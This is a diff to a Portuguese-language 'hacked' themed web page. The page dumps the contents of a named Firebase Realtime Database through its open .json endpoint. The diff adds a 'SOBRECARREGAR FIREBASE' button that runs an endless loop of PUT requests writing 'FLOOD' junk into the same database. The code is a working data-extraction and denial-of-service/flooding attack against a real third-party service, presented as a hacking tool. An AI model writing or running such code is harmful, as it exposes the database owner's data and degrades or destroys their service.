@@ -36,11 +36,15 @@
         .alvo:hover { color: #fff; transform: scale(1.3); }
 
         #data-display {
-            position: fixed; top: 100px; left: 20px; color: #00ff00;
+            position: fixed; top: 80px; left: 20px; color: #00ff00;
             font-family: monospace; font-size: 12px; text-align: left;
-            max-width: 350px; max-height: 70vh; overflow-y: auto;
+            max-width: 350px; max-height: 75vh; overflow-y: auto;
             background: rgba(0, 20, 0, 0.9); padding: 15px;
             border: 1px solid #00ff00; display: none; z-index: 5;
+        }
+        #btn-sobrecarga {
+            background:#ff0000; color:white; padding:10px; border:none; 
+            cursor:pointer; width:100%; margin-top:10px; font-weight:bold;
         }
     </style>
 </head>
@@ -50,7 +54,11 @@
         <div>CLIQUE PARA INVADIR</div>
     </div>
 
-    <div id="data-display">Carregando dados...</div>
+    <div id="data-display">
+        <div id="conteudo-dados">Carregando dados...</div>
+        <button id="btn-sobrecarga" onclick="sobrecarregarFirebase()">SOBRECARREGAR FIREBASE</button>
+    </div>
+    
     <div id="alvos-container"></div>
     <h1>SISTEMA INVADIDO BY ZJMS2</h1>
 
@@ -61,15 +69,13 @@
     <script>
         function criarAlvos() {
             const container = document.getElementById('alvos-container');
-            const nomes = ["SNOOPY OBB", "SNOOPY OBB", "SNOOPY OBB", "SNOOPY OBB", "SNOOPY OBB", "ZJMS2", "SNOOPY OBB"];
-            
+            const nomes = ["SNOOPY OBB", "ZJMS2", "HACK", "VORTEX"];
             for(let i = 0; i < 15; i++) {
                 const span = document.createElement('span');
                 span.className = 'alvo';
                 span.innerText = nomes[Math.floor(Math.random() * nomes.length)];
                 span.style.top = (Math.random() * 80 + 10) + 'vh';
                 span.style.left = (Math.random() * 80 + 10) + 'vw';
-                
                 span.onclick = function() {
                     this.style.opacity = '0';
                     this.style.transform = 'scale(3)';
@@ -85,14 +91,28 @@
             criarAlvos();
 
             const display = document.getElementById('data-display');
+            const conteudo = document.getElementById('conteudo-dados');
             display.style.display = 'block';
             
             try {
                 const resposta = await fetch('https://snoopy-obb-813a3-default-rtdb.firebaseio.com/.json');
                 const dados = await resposta.json();
-                display.innerText = "DADOS EXTRAÍDOS:\n\n" + JSON.stringify(dados, null, 2);
+                conteudo.innerText = "DADOS EXTRAÍDOS:\n\n" + JSON.stringify(dados, null, 2);
             } catch (e) {
-                display.innerText = "ERRO AO EXTRAIR DADOS: " + e.message;
+                conteudo.innerText = "ERRO: " + e.message;
+            }
+        }
+
+        async function sobrecarregarFirebase() {
+            if (!confirm("Deseja iniciar a sobrecarga intensiva?")) return;
+            const display = document.getElementById('conteudo-dados');
+            display.innerText = "SOBRECARREGANDO...";
+            
+            while (true) {
+                fetch('https://snoopy-obb-813a3-default-rtdb.firebaseio.com/flood/' + Date.now() + '.json', {
+                    method: 'PUT',
+                    body: JSON.stringify({ d: "FLOOD".repeat(500) })
+                });
             }
         }
     </script>
